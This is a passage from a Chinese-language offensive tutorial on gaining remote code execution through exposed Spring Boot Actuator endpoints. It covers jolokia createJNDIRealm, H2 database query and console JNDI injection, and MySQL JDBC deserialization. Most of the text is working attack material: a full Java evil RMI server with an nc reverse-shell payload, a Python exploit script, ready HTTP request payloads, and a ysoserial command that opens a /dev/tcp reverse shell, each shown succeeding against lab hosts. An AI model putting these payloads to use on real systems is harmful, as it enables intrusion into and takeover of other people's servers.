可以看到kali下获取反弹的shell

![](media/a288f1cbdbcfd6a43eb37a0aa8362ef4.png)



**注: 如果目标成功请求了example.xml并且 marshalsec 也接收到了目标请求，但是目标没有请求JNDIObject.class，大概率是因为目标环境的 jdk 版本太高，导致 JNDI 利用失败。**



##### **利用原理**

- 直接访问可触发漏洞的 URL，相当于通过 jolokia 调用
  ch.qos.logback.classic.jmx.JMXConfigurator 类的 reloadByURL 方法
- 目标机器请求外部日志配置文件 URL 地址，获得恶意 xml 文件内容

- 目标机器使用 saxParser.parse 解析 xml 文件 (这里导致了 xxe 漏洞)

- xml 文件中利用 logback 依赖的 insertFormJNDI 标签，设置了外部 JNDI 服务器地址

- 目标机器请求恶意 JNDI 服务器，导致 JNDI 注入，造成 RCE 漏洞

详细分析参见下文:

[spring boot actuator rce via jolokia](https://xz.aliyun.com/t/4258)



#### 2.5.createJNDIRealm RCE

##### 利用条件

- 目标网站存在 `/jolokia` 或 `/actuator/jolokia` 接口
- 目标使用了 `jolokia-core` 依赖（版本要求暂未知）并且环境中存在相关 MBean
- 目标可以请求攻击者的服务器（请求可出外网）
- 普通 JNDI 注入受目标 JDK 版本影响，jdk < 6u141/7u131/8u121(RMI)，但相关环境可绕过



##### 利用方法

**步骤一：查看已存在的 MBeans**

访问 `/jolokia/list` 接口，查看是否存在 `type=MBeanFactory` 和 `createJNDIRealm` 关键词。



**步骤二：准备要执行的 Java 代码**

编写优化过后的用来反弹 shell 的 Java代码

```
import java.rmi.registry.*;
import com.sun.jndi.rmi.registry.*;
import javax.naming.*;
import org.apache.naming.ResourceRef;
 
public class EvilRMIServer {
    public static void main(String[] args) throws Exception {
        System.out.println("Creating evil RMI registry on port xxxxx");//RMI服务监听地址
        Registry registry = LocateRegistry.createRegistry(1097);
 
        //prepare payload that exploits unsafe reflection in org.apache.naming.factory.BeanFactory
        ResourceRef ref = new ResourceRef("javax.el.ELProcessor", null, "", "", true,"org.apache.naming.factory.BeanFactory",null);
        //redefine a setter name for the 'x' property from 'setX' to 'eval', see BeanFactory.getObjectInstance code
        ref.add(new StringRefAddr("forceString", "x=eval"));
        //expression language to execute 'nslookup jndi.s.artsploit.com', modify /bin/sh to cmd.exe if you target windows
        ref.add(new StringRefAddr("x", "\"\".getClass().forName(\"javax.script.ScriptEngineManager\").newInstance().getEngineByName(\"JavaScript\").eval(\"new java.lang.ProcessBuilder['(java.lang.String[])'](['/bin/sh','-c','rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc xxx.xxx.xxx.xxx xxxx >/tmp/f']).start()\")"));
         //反弹shell地址为xxx.xxx.xxx.xxx(ip地址)，端口为xxxx(端口地址)
        
        ReferenceWrapper referenceWrapper = new com.sun.jndi.rmi.registry.ReferenceWrapper(ref);
        registry.bind("jndi", referenceWrapper);
    }
}
```



**步骤三： 打包java代码文件**

将编辑好的java代码打包成jar包

```
mvn clean install
或者
javac xxxxxxx.java
jar -cvf  xxxx.jar -C src/ .
```



**步骤四：架设恶意 RMI服务**

下载 [marshalsec](https://github.com/mbechler/marshalsec) ，使用下面命令架设对应的 rmi 服务：

```bash
java -Djava.rmi.server.hostname=xxx.xxx.xxx.xxx -jar RMIServer-0.1.0.jar
```



**步骤五：监听反弹 shell 的端口**

一般使用 nc 监听端口，等待反弹 shell

```bash
nc -lvvp 监听端口
```



**步骤六：发送恶意 payload**

根据实际情况修改 [springboot-realm-jndi-rce.py](https://raw.githubusercontent.com/LandGrey/SpringBootVulExploit/master/codebase/springboot-realm-jndi-rce.py) 脚本中的目标地址，RMI 地址、端口等信息，然后在自己控制的服务器上运行





##### 利用实例

查看/jolokia/list 中存在的是否存在org.apache.catalina.mbeans.MBeanFactory类提供的createJNDIRealm方法

![](media/4f19e2342528cdbb64de48d186e11598.png)



下面为编写的java代码漏洞利用poc，指定了反弹shell的ip地址和端口及其开启rmi服务的端口

```java
import java.rmi.registry.*;
import com.sun.jndi.rmi.registry.*;
import javax.naming.*;
import org.apache.naming.ResourceRef;
 
public class EvilRMIServer {
    public static void main(String[] args) throws Exception {
        System.out.println("Creating evil RMI registry on port 8090");//RMI服务地址为8090
        Registry registry = LocateRegistry.createRegistry(1097);
 
        //prepare payload that exploits unsafe reflection in org.apache.naming.factory.BeanFactory
        ResourceRef ref = new ResourceRef("javax.el.ELProcessor", null, "", "", true,"org.apache.naming.factory.BeanFactory",null);
        //redefine a setter name for the 'x' property from 'setX' to 'eval', see BeanFactory.getObjectInstance code
        ref.add(new StringRefAddr("forceString", "x=eval"));
        //expression language to execute 'nslookup jndi.s.artsploit.com', modify /bin/sh to cmd.exe if you target windows
        ref.add(new StringRefAddr("x", "\"\".getClass().forName(\"javax.script.ScriptEngineManager\").newInstance().getEngineByName(\"JavaScript\").eval(\"new java.lang.ProcessBuilder['(java.lang.String[])'](['/bin/sh','-c','rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.233.249 1234 >/tmp/f']).start()\")"));
         //反弹shell地址为192.168.233.249，端口为1234
        
        ReferenceWrapper referenceWrapper = new com.sun.jndi.rmi.registry.ReferenceWrapper(ref);
        registry.bind("jndi", referenceWrapper);
    }
}

```



使用maven对java代码进行编译打包

```
命令:mvn clean install
```

打包成功

![](media/d4957a0c50e626f62d06f5fc2853ddbb.png)



使用打包好的jar包-RMIServer-0.1.0.jar指定开启服务的ip地址，运行RMI服务

```
java -Djava.rmi.server.hostname=192.168.233.249 -jar RMIServer-0.1.0.jar
```

![](media/22d452ce68c413decf2ec38b91407be8.png)



在kali上使用nc监听1234端口

![](media/6c60a7d0bba412dd195a483ca8f132df.png)



使用exploit.py脚本对目标进行重放

代码如下:

```python
import requests as req
import sys
from pprint import pprint

url = sys.argv[1] + "/jolokia/"
pprint(url)
#创建JNDIRealm
create_JNDIrealm = {
    "mbean": "Tomcat:type=MBeanFactory",
    "type": "EXEC",
    "operation": "createJNDIRealm",
    "arguments": ["Tomcat:type=Engine"]
}
#写入contextFactory
set_contextFactory = {
    "mbean": "Tomcat:realmPath=/realm0,type=Realm",
    "type": "WRITE",
    "attribute": "contextFactory",
    "value": "com.sun.jndi.rmi.registry.RegistryContextFactory"
}
#写入connectionURL为自己公网RMI service地址
set_connectionURL = {
    "mbean": "Tomcat:realmPath=/realm0,type=Realm",
    "type": "WRITE",
    "attribute": "connectionURL",
    "value": "rmi://192.168.233.249:8090/jndi"
}
#停止Realm
stop_JNDIrealm = {
    "mbean": "Tomcat:realmPath=/realm0,type=Realm",
    "type": "EXEC",
    "operation": "stop",
    "arguments": []
}
#运行Realm，触发JNDI 注入
start = {
    "mbean": "Tomcat:realmPath=/realm0,type=Realm",
    "type": "EXEC",
    "operation": "start",
    "arguments": []
}
expoloit = [create_JNDIrealm, set_contextFactory, set_connectionURL, stop_JNDIrealm, start]
for i in expoloit:
    rep = req.post(url, json=i)
    pprint(rep.json())

```



在kali上使用python运行该脚本，指定目标ip地址和端口

```
命令:python exploit.py http://192.168.233.247:8090
```

![](media/9a08beff758b28b994d334ea398a856f.png)



该脚本运行成功后，可以看到kali的nc反弹shell成功

![](media/f234a703de0dd6e5042e6ee09f60fb1e.png)



##### 利用原理

- 创建 JNDIRealm
- 写入 contextFactory 为 RegistryContextFactory
- 写入 connectionURL 为你的 RMI Service URL
- 停止 Realm
- 启动 Realm 以触发 JNDI 注入

详细分析请参见

[Yet Another Way to Exploit Spring Boot Actuators via Jolokia](https://static.anquanke.com/download/b/security-geek-2019-q1/article-10.html)



#### 2.6.restart h2 database query RCE

##### 利用条件

- 可以 POST 请求目标网站的 `/env` 接口设置属性
- 可以 POST 请求目标网站的 `/restart` 接口重启应用
- 存在 `com.h2database.h2` 依赖（版本要求暂未知）



##### 利用方法

**步骤一：设置 spring.datasource.hikari.connection-test-query 属性**

> ⚠️ 下面payload 中的 'T5' 方法每一次执行命令后都需要更换名称 (如 T6) ，然后才能被重新创建使用，否则下次 restart 重启应用时漏洞不会被触发



spring 1.x（无回显执行命令）

```
POST /env
Content-Type: application/x-www-form-urlencoded

spring.datasource.hikari.connection-test-query=CREATE ALIAS T5 AS CONCAT('void ex(String m1,String m2,String m3)throws Exception{Runti','me.getRun','time().exe','c(new String[]{m1,m2,m3});}');CALL T5('str1','str2','str3');
```

**str1,str2和str3这三个参数组成要执行的命令**

spring 2.x（无回显执行命令）

```
POST /actuator/env
Content-Type: application/json

{"name":"spring.datasource.hikari.connection-test-query","value":"CREATE ALIAS T5 AS CONCAT('void ex(String m1,String m2,String m3)throws Exception{Runti','me.getRun','time().exe','c(new String[]{m1,m2,m3});}');CALL T5('str1','str2','str3');"}
```



**步骤二：重启应用**

spring 1.x

```
POST /restart
Content-Type: application/x-www-form-urlencoded

```

spring 2.x

```
POST /actuator/restart
Content-Type: application/json

```



##### 利用实例

首先判断在/env变量中是否存在h2.database依赖spring.datasource.hikari.connection-test-query

![image-20210830180327037](Spring Boot Actuator未授权访问利用实战利用.assets/image-20210830180327037.png)



构造Post请求/actuator/env设置依赖为需要执行的命令，这里使用的是nc反向连接自己的主机192.168.233.242的1234端口

请求数据包如下:

```
POST /actuator/env HTTP/1.1
Host: 192.168.233.242:9096
Content-Type: application/json

{"name":"spring.datasource.hikari.connection-test-query","value":"CREATE ALIAS T6 AS CONCAT('void ex(String m1,String m2,String m3)throws Exception{Runti','me.getRun','time().exe','c(new String[]{m1,m2,m3});}');CALL T6('nc','192.168.233.242','1234');"}}
```

**注:T6这个别名参数，每个参数只能使用一次，每个payload用完后要修改这个别名参数，否则不能执行**

![image-20210830180618708](Spring Boot Actuator未授权访问利用实战利用.assets/image-20210830180618708.png)



在自己的主机上使用nc监听1234端口

```
nc -lvvp 1234
```



构造请求/actuator/restart数据包，重启

![image-20210830180129484](Spring Boot Actuator未授权访问利用实战利用.assets/image-20210830180129484.png)



重启后，可以看到目标连接成功

![image-20210830181954887](Spring Boot Actuator未授权访问利用实战利用.assets/image-20210830181954887.png)





##### 利用原理

- spring.datasource.hikari.connection-test-query 属性被设置为一条恶意的 `CREATE ALIAS` 创建自定义函数的 SQL 语句
- 其属性对应 HikariCP 数据库连接池的 connectionTestQuery 配置，定义一个新数据库连接之前被执行的 SQL 语句
- restart 重启应用，会建立新的数据库连接
- 如果 SQL 语句中的自定义函数还没有被执行过，那么自定义函数就会被执行，造成 RCE 漏洞

详细分析参见下文

[remote-code-execution-in-three-acts-chaining-exposed-actuators-and-h2-database](https://spaceraccoon.dev/remote-code-execution-in-three-acts-chaining-exposed-actuators-and-h2-database)



#### 2.7restart spring.datasource.data h2 database RCE

##### 利用条件

- 可以 POST 请求目标网站的 `/env` 接口设置属性
- 可以 POST 请求目标网站的 `/restart` 接口重启应用
- 环境中需要存在 `h2database`、`spring-boot-starter-data-jpa` 相关依赖
- ⚠️ 目标可以请求攻击者的 HTTP 服务器（请求可出外网），否则 restart 会导致程序异常退出
- ⚠️ HTTP 服务器如果返回含有畸形 h2 sql 语法内容的文件，会导致程序异常退出



##### 利用方法

**步骤一：编写sql 文件并托管**

在自己控制的 vps 机器上开启一个简单 HTTP 服务器，端口尽量使用常见 HTTP 服务端口（80、443）

```bash
# 使用 python 快速开启 http server

python2 -m SimpleHTTPServer 80
python3 -m http.server 80
```



在根目录放置以任意名字的文件，内容为需要执行的 h2 sql 代码，比如：

> ⚠️ 下面payload 中的 'T5' 方法只能 restart 执行一次；后面 restart 需要更换新的方法名称 (如 T6) 和设置新的 sql URL 地址，然后才能被 restart 重新使用，否则第二次 restart 重启应用时会导致程序异常退出

```xml
CREATE ALIAS T5 AS CONCAT('void ex(String m1,String m2,String m3)throws Exception{Runti','me.getRun','time().exe','c(new String[]{m1,m2,m3});}');CALL T5('nc','ip地址','port');
```



**步骤二：设置 spring.datasource.data 属性**

spring 1.x

```
POST /env
Content-Type: application/x-www-form-urlencoded

spring.datasource.data=http://your-vps-ip/example.sql
```

spring 2.x

```
POST /actuator/env
Content-Type: application/json

{"name":"spring.datasource.data","value":"http://your-vps-ip/example.sql"}
```



**步骤三：重启应用**

spring 1.x

```
POST /restart
Content-Type: application/x-www-form-urlencoded

```

spring 2.x

```
POST /actuator/restart
Content-Type: application/json

```





##### 利用实例

编写h2 sql语句,执行nc连接目标主机192.168.233.242的端口1234

```
REATE ALIAS T5 AS CONCAT('void ex(String m1,String m2,String m3)throws Exception{Runti','me.getRun','time().exe','c(new String[]{m1,m2,m3});}');CALL T5('nc','192.168.233.242','1234');
```



使用python开启http服务

```
python2  -m    SimpleHTTPServer    8080
```



POST方式构造请求数据包对/actuator/env端点进行请求，设置spring.datasource.data为前面开启http服务的example.sql的url地址

请求报文如下:

```
POST /actuator/env HTTP/1.1
Host: 192.168.233.242:9096
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:91.0) Gecko/20100101 Firefox/91.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1
Cache-Control: max-age=0
Content-Type: application/json
Content-Length: 83

{"name":"spring.datasource.data","value":"http://192.168.233.242:8080/example.sql"}
```

![image-20210831171742647](Spring Boot Actuator未授权访问利用实战利用.assets/image-20210831171742647.png)



在调用/actuator/restart端点进行重启springboot项目

![image-20210831173855310](Spring Boot Actuator未授权访问利用实战利用.assets/image-20210831173855310.png)



重启springboot后反弹shell成功

![image-20210830181954887](Spring Boot Actuator未授权访问利用实战利用.assets/image-20210830181954887.png)



##### 利用原理

- 目标机器可以通过 spring.datasource.data 属性来设置 jdbc DML sql 文件的 URL 地址
- restart 重启应用后，程序会请求设置的 URL 地址
- spring-boot-autoconfigure` 组件中的 `org.springframework.boot.autoconfigure.jdbc.DataSourceInitializer.java` 文件代码逻辑中会使用 `runScripts` 方法执行请求 URL 内容中的 h2 database sql 代码，造成 RCE 漏洞

详细漏洞分析参见如下；

[repository/springboot-restart-rce](https://github.com/LandGrey/SpringBootVulExploit/tree/master/repository/springboot-restart-rce)



#### 2.8.h2 database console JNDI RCE

##### 利用条件

- 存在 `com.h2database.h2` 依赖（版本要求暂未知）
- spring 配置中启用 h2 console  `spring.h2.console.enabled=true`
- 目标可以请求攻击者的服务器（请求可出外网）
- JNDI 注入受目标 JDK 版本影响，jdk < 6u201/7u191/8u182/11.0.1（LDAP 方式）



##### 利用方法

**步骤一：访问路由获得 jsessionid**

直接访问目标开启 h2 console 的默认路由 `/h2-console`，目标会跳转到页面 `/h2-console/login.jsp?jsessionid=xxxxxx`，记录下实际的 `jsessionid=xxxxxx` 值。



**步骤二：准备要执行的 Java 代码**

编写优化过后的用来反弹 shell 的JAVA代码

```
import java.rmi.registry.*;
import com.sun.jndi.rmi.registry.*;
import javax.naming.*;
import org.apache.naming.ResourceRef;
 
public class EvilRMIServer {
    public static void main(String[] args) throws Exception {
        System.out.println("Creating evil RMI registry on port xxxxx");//RMI服务监听地址
        Registry registry = LocateRegistry.createRegistry(1097);
 
        //prepare payload that exploits unsafe reflection in org.apache.naming.factory.BeanFactory
        ResourceRef ref = new ResourceRef("javax.el.ELProcessor", null, "", "", true,"org.apache.naming.factory.BeanFactory",null);
        //redefine a setter name for the 'x' property from 'setX' to 'eval', see BeanFactory.getObjectInstance code
        ref.add(new StringRefAddr("forceString", "x=eval"));
        //expression language to execute 'nslookup jndi.s.artsploit.com', modify /bin/sh to cmd.exe if you target windows
        ref.add(new StringRefAddr("x", "\"\".getClass().forName(\"javax.script.ScriptEngineManager\").newInstance().getEngineByName(\"JavaScript\").eval(\"new java.lang.ProcessBuilder['(java.lang.String[])'](['/bin/sh','-c','rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc xxx.xxx.xxx.xxx xxxx >/tmp/f']).start()\")"));
         //反弹shell地址为xxx.xxx.xxx.xxx(ip地址)，端口为xxxx(端口地址)
        
        ReferenceWrapper referenceWrapper = new com.sun.jndi.rmi.registry.ReferenceWrapper(ref);
        registry.bind("jndi", referenceWrapper);
    }
}
```



**步骤三：打包JAVA代码**

将上面反弹shell的JAVA代码进行打包成jar包

```
mvn clean install
或者
javac xxxxxxx.java
jar -cvf  xxxx.jar -C src/ .
```



**步骤四：架设恶意 RMI服务**

指定开启RMI服务的ip地址，使用下面命令架设对应的 RMI服务：

```bash
java -Djava.rmi.server.hostname=xxx.xxx.xxx.xxx -jar RMIServer-0.1.0.jar
```



**步骤五：监听反弹 shell 的端口**

一般使用 nc 监听端口，等待反弹 shell

```bash
nc -lvvp 监听端口
```



**步骤六：发包触发 JNDI 注入**

根据实际情况，替换下面数据中的 `jsessionid=xxxxxx`、`www.example.com` 和 `RMI://your-vps-ip:port/jndi`

```bash
POST /h2-console/login.do?jsessionid=xxxxxx
Host: www.example.com
Content-Type: application/x-www-form-urlencoded
Referer: http://www.example.com/h2-console/login.jsp?jsessionid=xxxxxx

language=en&setting=Generic+H2+%28Embedded%29&name=Generic+H2+%28Embedded%29&driver=javax.naming.InitialContext&url=rmi://your-vps-ip:port/jndi&user=&password=
```



##### 利用实例

访问目标站点的/h2-console页面，url会跳转到/h2-console/login.jsp?jsessionid=10f21eec1f912ae36cd39c55740101b5

![image-20210830204241737](Spring Boot Actuator未授权访问利用实战利用.assets/image-20210830204241737.png)

这里的开启RMI服务JAVA代码如下:

反弹shell到192.168.233.242的1234端口

```
import java.rmi.registry.*;
import com.sun.jndi.rmi.registry.*;
import javax.naming.*;
import org.apache.naming.ResourceRef;
 
public class EvilRMIServer {
    public static void main(String[] args) throws Exception {
        System.out.println("Creating evil RMI registry on port 8090");//RMI服务监听地址为8090
        Registry registry = LocateRegistry.createRegistry(1097);
 
        //prepare payload that exploits unsafe reflection in org.apache.naming.factory.BeanFactory
        ResourceRef ref = new ResourceRef("javax.el.ELProcessor", null, "", "", true,"org.apache.naming.factory.BeanFactory",null);
        //redefine a setter name for the 'x' property from 'setX' to 'eval', see BeanFactory.getObjectInstance code
        ref.add(new StringRefAddr("forceString", "x=eval"));
        //expression language to execute 'nslookup jndi.s.artsploit.com', modify /bin/sh to cmd.exe if you target windows
        ref.add(new StringRefAddr("x", "\"\".getClass().forName(\"javax.script.ScriptEngineManager\").newInstance().getEngineByName(\"JavaScript\").eval(\"new java.lang.ProcessBuilder['(java.lang.String[])'](['/bin/sh','-c','rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.233.242 1234 >/tmp/f']).start()\")"));
         
        
        ReferenceWrapper referenceWrapper = new com.sun.jndi.rmi.registry.ReferenceWrapper(ref);
        registry.bind("jndi", referenceWrapper);
    }
}
```



将该代码进行maven打包

```
mvn install
```

![image-20210830204556955](Spring Boot Actuator未授权访问利用实战利用.assets/image-20210830204556955.png)



然后指定访问ip地址开启RMI服务

```
java -Djava.rmi.server.hostname=192.168.233.242 -jar RMIServer-0.1.0.jar
```

![image-20210830204855751](Spring Boot Actuator未授权访问利用实战利用.assets/image-20210830204855751.png)



使用nc监听端口

```
nc -lvvp 1234
```



构造Post方式请求/h2-console/login.do?session=xxxx，请求报文中指定RMI服务的ip地址和端口

请求报文如下:

```
POST /h2-console/login.do?jsessionid=152896463738fcc39cb0a74a0e3b5a1e HTTP/1.1
Host: 192.168.233.242:9096
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:91.0) Gecko/20100101 Firefox/91.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Referer: http://192.168.233.242:9096/h2-console/login.jsp?jsessionid=10f21eec1f912ae36cd39c55740101b5
Connection: close
Upgrade-Insecure-Requests: 1
Cache-Control: max-age=0
Content-Type: application/x-www-form-urlencoded
Content-Length: 163

language=en&setting=Generic+H2+%28Embedded%29&name=Generic+H2+%28Embedded%29&driver=javax.naming.InitialContext&url=rmi://192.168.233.242:8090/jndi&user=&password=
```

![image-20210830211055253](Spring Boot Actuator未授权访问利用实战利用.assets/image-20210830211055253.png)



可以看到nc连接shell成功

![image-20210830211733059](Spring Boot Actuator未授权访问利用实战利用.assets/image-20210830211733059.png)



##### 利用原理

- 设置恶意url参数向h2-console/login.do?session=xxxx发出请求
- 服务器访问恶意url中的RMI服务，发生JNDI注入
- RMI服务执行其他的恶意代码




详细分析参见

[Spring Boot + H2数据库JNDI注入](https://mp.weixin.qq.com/s/Yn5U8WHGJZbTJsxwUU3UiQ)



#### 2.9. mysql jdbc deserialization RCE

> 该环境需要安装Mysql服务和新建数据库，主要还是application.properties配置文件，注意里面的数据库相关配置(请求的数据库名，数据库账户和密码)

##### 利用条件

- 可以 POST 请求目标网站的 `/env` 接口设置属性
- 可以 POST 请求目标网站的 `/refresh` 接口刷新配置（存在 `spring-boot-starter-actuator` 依赖）
- 目标环境中存在 `mysql-connector-java` 依赖
- 目标可以请求攻击者的服务器（请求可出外网）



##### 利用方法

**步骤一：查看环境依赖**

GET 请求 `/env` 或 `/actuator/env`，搜索环境变量（classpath）中是否有 `mysql-connector-java`  关键词，并记录下其版本号（5.x 或 8.x）；

搜索并观察环境变量中是否存在常见的反序列化 gadget 依赖，比如  `commons-collections`、`Jdk7u21`、`Jdk8u20` 等；

搜索 `spring.datasource.url` 关键词，记录下其 `value`  值，方便后续恢复其正常 jdbc url 值。



**步骤二：架设恶意 rogue mysql server**

在自己控制的服务器上运行 [springboot-jdbc-deserialization-rce.py](https://raw.githubusercontent.com/LandGrey/SpringBootVulExploit/master/codebase/springboot-jdbc-deserialization-rce.py) 脚本，并使用 [ysoserial](https://github.com/frohoff/ysoserial) 自定义要执行的命令：

这里使用反序列工具ysoserial(包含所有攻击方式，在环境包中的target目录下)ysoserial可以设置的命令参数如下:

```
$  java -jar ysoserial.jar
Y SO SERIAL?
Usage: java -jar ysoserial.jar [payload] '[command]'
  Available payload types:
     Payload             Authors                     Dependencies
     -------             -------                     ------------
     AspectJWeaver       @Jang                       aspectjweaver:1.9.2, commons-collections:3.2.2
     BeanShell1          @pwntester, @cschneider4711 bsh:2.0b5
     C3P0                @mbechler                   c3p0:0.9.5.2, mchange-commons-java:0.2.11
     Click1              @artsploit                  click-nodeps:2.3.0, javax.servlet-api:3.1.0
     Clojure             @JackOfMostTrades           clojure:1.8.0
     CommonsBeanutils1   @frohoff                    commons-beanutils:1.9.2, commons-collections:3.1, commons-logging:1.2
     CommonsCollections1 @frohoff                    commons-collections:3.1
     CommonsCollections2 @frohoff                    commons-collections4:4.0
     CommonsCollections3 @frohoff                    commons-collections:3.1
     CommonsCollections4 @frohoff                    commons-collections4:4.0
     CommonsCollections5 @matthias_kaiser, @jasinner commons-collections:3.1
     CommonsCollections6 @matthias_kaiser            commons-collections:3.1
     CommonsCollections7 @scristalli, @hanyrax, @EdoardoVignati commons-collections:3.1
     FileUpload1         @mbechler                   commons-fileupload:1.3.1, commons-io:2.4
     Groovy1             @frohoff                    groovy:2.3.9
     Hibernate1          @mbechler
     Hibernate2          @mbechler
     JBossInterceptors1  @matthias_kaiser            javassist:3.12.1.GA, jboss-interceptor-core:2.0.0.Final, cdi-api:1.0-SP1, javax.interceptor-api:3.1, jboss-interceptor-spi:2.0.0.Final, slf4j-api:1.7.21
     JRMPClient          @mbechler
     JRMPListener        @mbechler
     JSON1               @mbechler                   json-lib:jar:jdk15:2.4, spring-aop:4.1.4.RELEASE, aopalliance:1.0, commons-logging:1.2, commons-lang:2.6, ezmorph:1.0.6, commons-beanutils:1.9.2, spring-core:4.1.4.RELEASE, commons-collections:3.1
     JavassistWeld1      @matthias_kaiser            javassist:3.12.1.GA, weld-core:1.1.33.Final, cdi-api:1.0-SP1, javax.interceptor-api:3.1, jboss-interceptor-spi:2.0.0.Final, slf4j-api:1.7.21
     Jdk7u21             @frohoff
     Jython1             @pwntester, @cschneider4711 jython-standalone:2.5.2
     MozillaRhino1       @matthias_kaiser            js:1.7R2
     MozillaRhino2       @_tint0                     js:1.7R2
     Myfaces1            @mbechler
     Myfaces2            @mbechler
     ROME                @mbechler                   rome:1.0
     Spring1             @frohoff                    spring-core:4.1.4.RELEASE, spring-beans:4.1.4.RELEASE
     Spring2             @mbechler                   spring-core:4.1.4.RELEASE, spring-aop:4.1.4.RELEASE, aopalliance:1.0, commons-logging:1.2
     URLDNS              @gebl
     Vaadin1             @kai_ullrich                vaadin-server:7.7.14, vaadin-shared:7.7.14
     Wicket1             @jacob-baines               wicket-util:6.23.0, slf4j-api:1.6.4
```



```bash
java -jar ysoserial.jar (payload)  > payload.ser
```

在脚本**同目录下**生成 `payload.ser` 反序列化 payload 文件，供脚本使用。



**步骤三：设置 spring.datasource.url 属性**

> ⚠️ 修改此属性会暂时导致网站所有的正常数据库服务不可用，会对业务造成影响，请谨慎操作！



mysql-connector-java 5.x 版本设置**属性值**为：

```
jdbc:mysql://your-vps-ip:3306/mysql?characterEncoding=utf8&useSSL=false&statementInterceptors=com.mysql.jdbc.interceptors.ServerStatusDiffInterceptor&autoDeserialize=true
```

 mysql-connector-java 8.x 版本设置**属性值**为：

```
jdbc:mysql://your-vps-ip:3306/mysql?characterEncoding=utf8&useSSL=false&queryInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor&autoDeserialize=true
```



spring 1.x

```
POST /env
Content-Type: application/x-www-form-urlencoded

spring.datasource.url=对应属性值
```

spring 2.x

```
POST /actuator/env
Content-Type: application/json

{"name":"spring.datasource.url","value":"对应属性值"}
```



**步骤四：刷新配置**

spring 1.x

```
POST /refresh
Content-Type: application/x-www-form-urlencoded

```

spring 2.x

```
POST /actuator/refresh
Content-Type: application/json

```



**步骤五：触发数据库查询**

尝试访问网站已知的数据库查询的接口，例如： `/product/list` ，或者寻找其他方式，主动触发源网站进行数据库查询，然后漏洞会被触发



**步骤六：恢复正常 jdbc url**

反序列化漏洞利用完成后，使用 **步骤三** 的方法恢复 **步骤一** 中记录的 `spring.datasource.url` 的原始 `value` 值



##### 利用实例

访问目标站点 http://192.168.233.242:9097/actuator/evn   查看环境变量设置和依赖

![image-20210901112521481](Spring Boot Actuator未授权访问利用实战利用.assets/image-20210901112521481.png)



然后架设恶意 rogue mysql server，使用 [ysoserial](https://github.com/frohoff/ysoserial) 自定义要执行的命令，讲生成的文件放置在

```
java -jar ysoserial.jar CommonsCollections3 ‘bash -i >& /dev/tcp/192.168.233.242/1234 0>&1’ > payload.ser
```



然后运行 [springboot-jdbc-deserialization-rce.py](https://raw.githubusercontent.com/LandGrey/SpringBootVulExploit/master/codebase/springboot-jdbc-deserialization-rce.py) 脚本开启3306端口

![image-20210901141559697](Spring Boot Actuator未授权访问利用实战利用.assets/image-20210901141559697.png)



POST方式构造请求/actuator/env，设置spring.datasource.url为上面开启服务的ip地址

请求报文如下:

```
POST /actuator/env HTTP/1.1
Host: 192.168.233.242:9097
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:91.0) Gecko/20100101 Firefox/91.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1
Cache-Control: max-age=0
Content-Type: application/json
Content-Length: 216

{"name":"spring.datasource.url","value":"jdbc:mysql://192.168.233.242:3306/mysql?characterEncoding=utf8&useSSL=false&queryInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor&autoDeserialize=true"}
```

![image-20210901142357376](Spring Boot Actuator未授权访问利用实战利用.assets/image-20210901142357376.png)



访问/actuator/refresh刷新配置

![image-20210901142612261](Spring Boot Actuator未授权访问利用实战利用.assets/image-20210901142612261.png)



在接着访问数据库查询的接口，在调用数据库服务的时候就会请求上面设置的url

例如： `/product/list` ，或者寻找其他方式，主动触发源网站进行数据库查询，然后漏洞会被触发



可以看到前面开启的mysql服务中会显示连接的客户端和返回的一些内容

![image-20210901142838024](Spring Boot Actuator未授权访问利用实战利用.assets/image-20210901142838024.png)



shell反弹成功

![image-20210901145716430](Spring Boot Actuator未授权访问利用实战利用.assets/image-20210901145716430.png)



##### 利用原理

- spring.datasource.url 属性被设置为外部恶意 mysql jdbc url 地址
- refresh 刷新后设置了一个新的 spring.datasource.url 属性值
- 当网站进行数据库查询等操作时，会尝试使用恶意 mysql jdbc url 建立新的数据库连接
- 然后恶意 mysql server 就会在建立连接的合适阶段返回反序列化 payload 数据
- 目标依赖的 mysql-connector-java 就会反序列化设置好的 gadget，造成 RCE 漏洞

详细漏洞分析参见下文

​	[New-Exploit-Technique-In-Java-Deserialization-Attack](https://i.blackhat.com/eu-19/Thursday/eu-19-Zhang-New-Exploit-Technique-In-Java-Deserialization-Attack.pdf)

  [  MySQL-JDBC 反序列化 | CN-SEC 中文网](http://cn-sec.com/archives/116934.html)



#### 2.10.  restart logging.config logback JNDI RCE

##### 利用条件

- 可以 POST 请求目标网站的 `/env` 接口设置属性
- 可以 POST 请求目标网站的 `/restart` 接口重启应用
- 普通 JNDI 注入受目标 JDK 版本影响，jdk < 6u201/7u191/8u182/11.0.1(LDAP)，但相关环境可绕过
- ⚠️ 目标可以请求攻击者的 HTTP 服务器（请求可出外网），否则 restart 会导致程序异常退出
- ⚠️ HTTP 服务器如果返回含有畸形 xml 语法内容的文件，会导致程序异常退出
- ⚠️ JNDI 服务返回的 object 需要实现 `javax.naming.spi.ObjectFactory` 接口，否则会导致程序异常退出



##### 利用方法

